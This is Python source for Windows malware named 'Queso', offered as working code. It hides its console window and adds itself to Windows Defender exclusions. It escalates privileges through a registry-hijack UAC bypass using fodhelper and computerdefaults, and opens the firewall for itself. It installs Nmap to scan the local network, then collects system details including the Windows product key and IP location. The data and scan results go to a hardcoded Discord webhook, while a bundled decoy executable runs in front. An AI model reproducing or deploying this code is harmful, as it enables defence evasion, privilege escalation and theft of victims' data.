import os
import sys
import subprocess
import ctypes
from threading import Thread
from urllib3 import PoolManager
import json
import random
import nmap3
from xml.etree import ElementTree
import zipfile


class Syscalls:

    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]: # Returns the location of the file and whether exe mode is enabled or not
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def ExcludeFromDefender(path: str = None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen(
            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path),
            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
        )

    @staticmethod
    def IsAdmin() -> bool:
        return subprocess.run("net session", shell= True, capture_output= True).returncode == 0

    @staticmethod
    def UACbypass(method: int = 1) -> None:
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
        
            if method == 1:
                if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
                if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
                execute("computerdefaults --nouacbypass")
                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            
            elif method == 2:
                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                execute("fodhelper --nouacbypass")
                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")

            os._exit(0)

    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False) -> str: # Generates a random string
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
        

class Network:

    @staticmethod
    def GetNetAdapters() -> list[str]:
        adapters = list()
        cmd = subprocess.run(
            "powershell -Command Get-NetAdapter -Name *",
            shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
        )
        lines = cmd.stdout.decode('utf-8').split('\n')
        for line in lines:
            if line.startswith("Name") or line.startswith("----") or line.isspace():
                pass
            else:
                print(line)
                adapter = line.split("   ")[0]
                if "..." in adapter:
                    pass
                else:
                    adapters.append(adapter)
        return adapters
    
    @staticmethod
    def GetNetConnection(adapter: str) -> str:
        cmd = subprocess.run(
            "powershell -Command Get-NetConnectionProfile -InterfaceAlias \"{}\"".format(adapter),
            shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
        )
        lines = cmd.stdout.decode('utf-8').split('\n')
        connection = ""
        for line in lines:
            if line.startswith("Name"):
                connection = line.split(" : ")[1]
                break
        if connection:
            return connection
        return "None"

    @staticmethod
    def DisableFirewall(path: str = None) -> None:
        adapters = Network.GetNetAdapters()
        for adapter in adapters:
            print(adapter)
            connection = Network.GetNetConnection(adapter)
            if connection == "None":
                pass
            else:
                subprocess.Popen(
                    "powershell -Command Set-NetConnectionProfile -Name '{}' -NetworkCategory Private".format(connection),
                    shell= True
                )
        subprocess.Popen(
            "powershell -Command Set-NetFirewallProfile -Profile Private -Enabled False",
            shell= True
        )

    @staticmethod
    def ExcludeFromFirewall(path:str = None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(path))

    @staticmethod
    def InstallNmap() -> None:
        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as zip:
            zip.extractall("C:\\Program Files (x86)")

    @staticmethod
    def NmapScan() -> ElementTree:
        nmap = nmap3.Nmap()
        return nmap.scan_command("192.168.1.1/24", arg="-sV -T4 -O -F --version-light")
        

class Tasks:

    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()


class Queso:

    Webhook: str = "https://discord.com/api/webhooks/1122499476712595519/FuVEZ0l0t3rXCjDcs_I8FrFY1Q1SlUGMdvjghQL31G0yOFWlBKJbQnL_MBHOWMkMs09q"
    TempFolder: str = None

    def __init__(self) -> None:
        while True:
            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok= True)
                break

        user_tasks = (
            (self.LaunchBoundApplication, False),
            (self.SendData, False)
        )

        admin_tasks = (
            
        )

        Syscalls.HideConsole()
        Utility.ExcludeFromDefender()

        if not Utility.IsAdmin():
            if Utility.GetSelf()[1] and not "--no-bypass" in sys.argv:
                    Utility.UACbypass()

        if Utility.IsAdmin():
            # Network.DisableFirewall()
            Network.ExcludeFromFirewall()

            if not os.path.exists("C:\\Program Files (x86)\\Nmap"):
                Network.InstallNmap()

            for func, daemon in admin_tasks:
                thread = Thread(target= func, daemon= daemon)
                thread.start()
                Tasks.AddTask(thread)

        for func, daemon in user_tasks:
            thread = Thread(target= func, daemon= daemon)
            thread.start()
            Tasks.AddTask(thread)

        Tasks.WaitForAll()

    def LaunchBoundApplication(self) -> None:
        boundExePath = os.path.join(sys._MEIPASS, "bound", "bound.exe")
        if os.path.isfile(boundExePath):
            subprocess.Popen("{}".format(boundExePath))

    def SendData(self) -> None:
        scan = Network.NmapScan()

        computerName = os.getenv("computername")
        computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
        uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()

        sys_info = f"""
            \nComputer Name: {computerName}
            \nOS: {computerOS}
            \nUUID: {uuid}
            \nCPU: {cpu}
            \nGPU: {gpu}
            \nProduct Key: {productKey}
        """

        http = PoolManager()

        try:
            r: dict = json.loads(http.request("GET", "http://ip-api.com/json/").data.decode())
            if r.get("status") != "success":
                raise Exception("Failed to retrieve IP info")
            data = f"""
                \nIP: {r['query']}
                \nRegion: {r['regionName']}
                \nCountry: {r['country']}
                \nTimezone: {r['timezone']}
            """
        except Exception:
            ip_info = "(No IP info)"
        else:
            ip_info = data

        payload = {
            "embeds": [
                {
                    "title": "Queso Project",
                    "description": f"""
                        __System Info__
                        \n```autohotkey\n{sys_info}```
                        \n__IP Info__
                        \n```prolog\n{ip_info}```
                    """,
                    "footer": {
                        "text": "Information by Queso"
                    }
                }
            ],
            "username": "Queso"
        }

        fields = dict()
        if scan:
            fields['file'] = ("{}.xml".format(os.getlogin()), ElementTree.tostring(scan))
        fields['payload_json'] = json.dumps(payload).encode()
        http.request("POST", self.Webhook, fields= fields)


if __name__ == "__main__" and os.name == "nt":

    queso = Queso()
